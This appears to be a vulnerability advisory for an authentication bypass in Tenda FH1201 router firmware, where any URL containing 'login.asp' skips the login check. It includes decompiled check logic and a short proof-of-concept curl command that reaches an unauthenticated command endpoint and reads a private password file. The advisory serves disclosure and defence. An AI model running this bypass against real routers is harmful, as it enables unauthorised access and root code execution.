# CVE-TBD: Authentication bypass in Tenda FH1201 httpd via `login.asp` substring matching

## Summary

The Tenda FH1201 web server exempts requests from authentication when the **request URL contains the
substring `login.asp`** anywhere in its path. An unauthenticated attacker can therefore reach any
protected `/goform` action or `/cgi-bin` handler by appending `/login.asp` to its path, for example
`POST /goform/exeCommand/login.asp`, and the request is processed with administrative privileges.

## Affected Product

- Vendor: Tenda
- Product: FH1201 (Wireless AC1200 Dual-Band Router, V1.0)
- Firmware: **V1.2.0.19(946)** — latest public release (2026-07-13)
  SHA-256 `da914fbce51366b648201ca02023cd42ba355791a72b5236ab44b60899062860`
- Presumably also ≤ v1.2.0.14(408)
- Status: the vendor lists FH1201 V1.0 as end-of-life (discontinued 2015) yet published this
  firmware on 2026-07-13 as a security update for CVE-2026-11405

## Vulnerability Details

- Type: Improper Authentication (**CWE-287**), Authentication Bypass by Alternate Name (**CWE-289**)
- Component: `bin/httpd` → `authSecurityHandler()` at `0x004a072c`
- Root cause: the handler classifies URLs into three groups:

```c
/* prefix exemptions */
strncmp(url, "/public/", 8) || strncmp(url, "/lang/", 6) || strncmp(url, "/images/", 8) ||
strncmp(url, "/css/", 5)  || strncmp(url, "/js/", 4)    || strncmp(url, "/pem/", 5)  ||
strncmp(url, "/goform/BulletinBoard", 21) || strncmp(url, "/lang", 5)

/* exact exemptions */
strcmp(url, "/favicon.ico") || strcmp(url, "/disable.asp") || strcmp(url, "/goform/ate") ||
strcmp(url, "/ate.asp")     || strcmp(url, "/goform/usbTest")

/* substring exemptions — the defect */
strstr(url, "/login/Auth")   /* intended */
strstr(url, "login.asp")     /* intended for the login page, but matches ANY path containing it */
```

The last test is a substring search over the whole request path, not a comparison against the login
page. Consequently `…/<any-handler>/login.asp` satisfies it. Two entries of the exact list
(`/ate.asp`, `/goform/usbTest`) do not correspond to any registered handler and are dead code, which
shows the list itself was not validated.

## Proof of Concept (non-destructive)

```bash
# 1) control: protected endpoint without the suffix → redirected to the login page
curl -i -X POST -d 'cmdinput=ls' http://<router>/goform/exeCommand
#    HTTP/1.1 302, Location: /login.asp

# 2) bypass: same action with the substring appended → handler executes, no credentials
curl -i -X POST --data-urlencode 'cmdinput=cat /etc_ro/passwd_private' \
     http://<router>/goform/exeCommand/login.asp
#    HTTP/1.1 200 + content of the file (read-only command)
```

Observed in the rehosted firmware: (1) `302 /login.asp`; (2) `200` with the requested file content.
The same suffix works for every registered `/goform` action (147 of 148 were reachable this way) and
for all `/cgi-bin` handlers.

## Impact

- The bypass is a **pre-authentication gateway to the whole administrative API**, including the
  command-injection endpoints reported earlier for this model (CVE-2024-41468 `/goform/exeCommand`,
  CVE-2024-41473 `/goform/WriteFacMac`), i.e. unauthenticated remote code execution as root.
- It also unlocks the configuration import / flash download handlers analysed in advisories 04 and 06.
- No user interaction, no credentials, LAN-reachable (WAN-reachable if remote management is enabled).

## CVSS 3.1

`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — **8.8**
Rationale: pre-auth bypass that yields full administrative control and reaches command injection;
scored as LAN vector because the management interface is bound to the LAN by default.

## Discovery

Discovered by Zimo-666 on 2026-10-17 via firmware rehosting (QEMU user-mode) and static analysis of
`authSecurityHandler`. Vendor notified: pending. CVE requested via CNA.
